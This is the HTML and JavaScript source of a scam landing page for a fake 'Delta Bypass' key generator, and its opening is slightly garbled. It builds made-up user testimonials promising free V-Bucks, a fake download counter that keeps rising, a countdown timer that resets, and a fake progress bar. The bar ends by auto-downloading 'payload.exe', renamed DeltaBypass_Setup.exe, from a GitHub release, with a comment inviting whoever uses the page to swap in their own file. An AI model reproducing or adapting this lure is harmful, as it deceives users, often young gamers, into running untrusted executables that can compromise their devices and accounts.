        .popup .progress {const DOWNLOAD_URL = "https://github.com/intel200155-cpu/the-info-one/releases/download/v1.0/payload.exe";

<body>

<div class="container">

    <!-- Fake testimonials feed -->

        <!-- filled by JS -->

<!-- Overlay / popup -->
<div class="overlay" id="loadingOverlay">
    <div class="popup">
        <h2>🔄 Generating your key...</h2>
        <div class="progress">
            <div class="fill" id="progressFill"></div>
        </div>

        <button class="close-btn" id="closePopup">Close</button>
    </div>
</div>

<script>
    // -------- FAKE USER FEED ----------
    const fakeUsers = [
        { name: "xXProGamerXx", avatar: "PG", msg: "Just claimed my key, works perfectly!" },
        { name: "NoobSlayer99", avatar: "NS", msg: "Best bypass ever, no scam." },
        { name: "EpicNinja", avatar: "EN", msg: "I got 500 V‑Bucks instantly!" },
        { name: "DarkWizard", avatar: "DW", msg: "Free keys are real, just claimed mine." },
        { name: "LuckyStrike", avatar: "LS", msg: "I was skeptical, but it actually works!" },
        { name: "ShadowHawk", avatar: "SH", msg: "Already redeemed my Delta key, thanks!" },
        { name: "PixelPirate", avatar: "PP", msg: "Five stars, would use again." },
        { name: "RapidFire", avatar: "RF", msg: "My friend told me about this, he got 1000 V‑Bucks." },
        { name: "NightOwl", avatar: "NO", msg: "It's not a virus, I swear! (jk, but it's fine)" },
        { name: "CrimsonFox", avatar: "CF", msg: "Just redeemed, got 2000 V‑Bucks. Awesome!" }
    ];

    const feedContainer = document.getElementById('feedContainer');

    // Shuffle and populate
    function shuffle(arr) {
        for (let i = arr.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [arr[i], arr[j]] = [arr[j], arr[i]];
        }
        return arr;
    }

    let feedItems = [];
    for (let i = 0; i < 3; i++) {
        feedItems = feedItems.concat(shuffle([...fakeUsers]));
    }
    feedItems = shuffle(feedItems);

    function renderFeed(items) {
        feedContainer.innerHTML = '';
        items.slice(0, 15).forEach(user => {
            const div = document.createElement('div');
            div.className = 'testimonial';
            div.innerHTML = `
                <div class="avatar">${user.avatar}</div>
                <div class="msg"><strong>${user.name}</strong> – ${user.msg}</div>
            `;
            feedContainer.appendChild(div);
        });
    }
    renderFeed(feedItems);

    // Add new random post every 3 seconds
    setInterval(() => {
        const user = fakeUsers[Math.floor(Math.random() * fakeUsers.length)];
        const variants = [
            "Just got my key! 🔥",
            "Claimed successfully!",
            "Thanks Delta Bypass!",
            "Awesome, worked again.",
            "Can't believe it's free!",
            "10/10 would recommend.",
            "Got 1500 V‑Bucks!",
            "Loving this, thanks!"
        ];
        const newMsg = variants[Math.floor(Math.random() * variants.length)];
        const newUser = { name: user.name, avatar: user.avatar, msg: newMsg };
        const div = document.createElement('div');
        div.className = 'testimonial';
        div.innerHTML = `
            <div class="avatar">${newUser.avatar}</div>
            <div class="msg"><strong>${newUser.name}</strong> – ${newUser.msg}</div>
        `;
        feedContainer.prepend(div);
        if (feedContainer.children.length > 20) {
            feedContainer.removeChild(feedContainer.lastChild);
        }
        // Update download counter
        const counter = document.getElementById('downloadCounter');
        let current = parseInt(counter.textContent.replace(/,/g, ''));
        current += Math.floor(Math.random() * 5) + 1;
        counter.textContent = current.toLocaleString();
    }, 3000);

    // -------- COUNTDOWN TIMER ----------
    let timeLeft = 600; // 10 minutes
    const timerEl = document.getElementById('timer');
    setInterval(() => {
        timeLeft--;
        if (timeLeft <= 0) timeLeft = 600;
        const mins = Math.floor(timeLeft / 60);
        const secs = timeLeft % 60;
        timerEl.textContent = `${mins.toString().padStart(2,'0')}:${secs.toString().padStart(2,'0')}`;
    }, 1000);

    // -------- DOWNLOAD LOGIC ----------
    const claimBtn = document.getElementById('claimBtn');
    const overlay = document.getElementById('loadingOverlay');
    const progressFill = document.getElementById('progressFill');
    const progressText = document.getElementById('progressText');

    // ★ REPLACE THIS URL WITH YOUR ACTUAL FILE DOWNLOAD LINK ★
    const DOWNLOAD_URL = "https://github.com/intel200155-cpu/the-info-one/releases/download/v1.0/payload.exe";

    claimBtn.addEventListener('click', function(e) {
        e.preventDefault();

        // Show overlay
        overlay.classList.add('active');

        let progress = 0;
        const interval = setInterval(() => {
            progress += Math.random() * 10 + 5;
            if (progress >= 100) {
                progress = 100;
                clearInterval(interval);
                // Start download
                startDownload();
            }
            progressFill.style.width = progress + '%';
            progressText.textContent = Math.floor(progress) + '%';
        }, 200);
    });

    function startDownload() {
        // Trigger download
        const link = document.createElement('a');
        link.href = DOWNLOAD_URL;
        link.download = 'DeltaBypass_Setup.exe';
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
        progressText.textContent = '✅ Download started!';
    }

    // Close popup manually
    document.getElementById('closePopup').addEventListener('click', function() {
        overlay.classList.remove('active');
    });

    // Click outside popup to close
    overlay.addEventListener('click', function(e) {
        if (e.target === overlay) {
            overlay.classList.remove('active');
        }
    });
</script>
